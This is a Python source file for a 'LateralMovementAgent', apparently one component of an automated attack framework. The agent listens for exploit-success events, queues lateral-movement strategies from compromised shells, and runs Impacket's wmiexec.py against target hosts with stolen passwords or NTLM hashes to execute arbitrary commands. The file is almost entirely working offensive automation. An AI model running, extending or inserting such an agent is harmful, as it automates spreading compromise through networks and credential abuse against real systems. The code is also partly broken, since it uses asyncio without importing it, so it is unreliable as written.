import logging
from core.logger import log
from core.data_models import LateralMovementReport, Strategy, AttackPhase, ErrorType
from config import settings
import subprocess
from core.context_manager import ContextManager # Import ContextManager
import time

from core.base_agent import BaseAgent


class LateralMovementAgent(BaseAgent):
    supported_phases = [AttackPhase.LATERAL_MOVEMENT]

    async def setup(self):
        """Asynchronous setup method for LateralMovementAgent."""
        self.pubsub_manager = self.orchestrator.pubsub_manager # Ensure pubsub_manager is available
        await self.pubsub_manager.subscribe("exploit_events", self._handle_exploit_event)

    async def _handle_exploit_event(self, message: dict):
        """Callback for exploit_events."""
        log.info(f"LateralMovementAgent: Received exploit event: {message}")
        if message.get("event_type") == "EXPLOIT_SUCCESS":
            shell_id = message.get("shell_id")
            if shell_id:
                log.info(f"LateralMovementAgent: Exploit successful, new shell_id: {shell_id}. Considering lateral movement.")
                # Create a new strategy to perform lateral movement from this shell
                new_strategy = Strategy(
                    phase=AttackPhase.LATERAL_MOVEMENT,
                    next_agent="LateralMovementAgent",
                    directive=f"Perform internal network reconnaissance and lateral movement from shell {shell_id}",
                    context={"shell_id": shell_id}
                )
                # Inject new strategy into orchestrator for dynamic execution
                if self.orchestrator and hasattr(self.orchestrator, 'inject_strategy'):
                    await self.orchestrator.inject_strategy(new_strategy)
                    log.info(f"LateralMovementAgent: New strategy for lateral movement from shell {shell_id} injected into orchestrator.")
                else:
                    # Fallback: Store in context for manual pickup
                    if self.context_manager:
                        strategies = self.context_manager.get('pending_strategies', [])
                        strategies.append(new_strategy)
                        self.context_manager.set('pending_strategies', strategies)
                    log.warning(f"LateralMovementAgent: New strategy for lateral movement from shell {shell_id} stored in context. Orchestrator needs to pick this up.")
            else:
                log.warning("LateralMovementAgent: EXPLOIT_SUCCESS event received but no shell_id found.")

    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs): # Changed shared_data to context_manager
        super().__init__(context_manager, orchestrator, **kwargs) # Pass context_manager to super
        self.logger = logging.getLogger(self.__class__.__name__)
        self.pubsub_manager = orchestrator.pubsub_manager # Add this line
        self.report_class = LateralMovementReport # Set report class

    async def run(self, strategy: Strategy, **kwargs) -> LateralMovementReport:
        start_time = time.time()
        target_host = strategy.context.get("target_host")
        username = strategy.context.get("username")
        password = strategy.context.get("password")
        ntlm_hash = strategy.context.get("hash")
        domain = strategy.context.get("domain", "") # Domain is often optional
        command = strategy.context.get("command")

        if not all([target_host, username, (password or ntlm_hash), command]):
            end_time = time.time()
            return LateralMovementReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                summary="Missing required context: target_host, username, (password or hash), and command.",
                errors=["Missing required context: target_host, username, (password or hash), and command."],
                error_type=ErrorType.CONFIGURATION
            )

        credentials = {
            "username": username,
            "domain": domain
        }
        if ntlm_hash:
            credentials['hash'] = ntlm_hash
        else:
            credentials['password'] = password

        impacket_script = strategy.context.get("impacket_script", "wmiexec.py")

        log.info(
            f"[LateralMovementAgent] Attempting to execute command on {target_host} using {impacket_script}.")

        try:
            # Base command
            cmd = [
                "python3",
                f"{settings.IMPACKET_PATH}/{impacket_script}",
            ]

            # Handle credentials (password vs. hash)
            credential_string = f"{credentials['domain']}/{credentials['username']}" if credentials['domain'] else credentials['username']

            if 'hash' in credentials:
                cmd.extend(["-hashes", f":{credentials['hash']}"])
                cmd.append(credential_string)
            else:
                cmd.append(f"{credential_string}:{credentials['password']}")

            # Add target and command
            cmd.extend([f"@{target_host}", command])

            log.info(
                f"[LateralMovementAgent] Executing command: {' '.join(cmd)}")

            # Execute the command
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)

            stdout_str = stdout.decode(errors='ignore')
            stderr_str = stderr.decode(errors='ignore')

            if process.returncode == 0:
                log.success(
                    f"[LateralMovementAgent] Command executed successfully on {target_host}.")
                summary = f"Command '{command}' executed successfully on {target_host}. Output: {stdout_str}"
                end_time = time.time()
                return LateralMovementReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    summary=summary
                )
            else:
                log.error(
                    f"[LateralMovementAgent] Failed to execute command on {target_host}.")
                summary = f"Failed to execute command on {target_host}. Error: {stderr_str}"
                end_time = time.time()
                return LateralMovementReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    summary=summary,
                    errors=[stderr_str],
                    error_type=ErrorType.LOGIC
                )

        except Exception as e:
            log.error(f"[LateralMovementAgent] An error occurred: {e}")
            end_time = time.time()
            return LateralMovementReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                summary=f"An error occurred: {e}",
                errors=[str(e)],
                error_type=ErrorType.LOGIC
            )
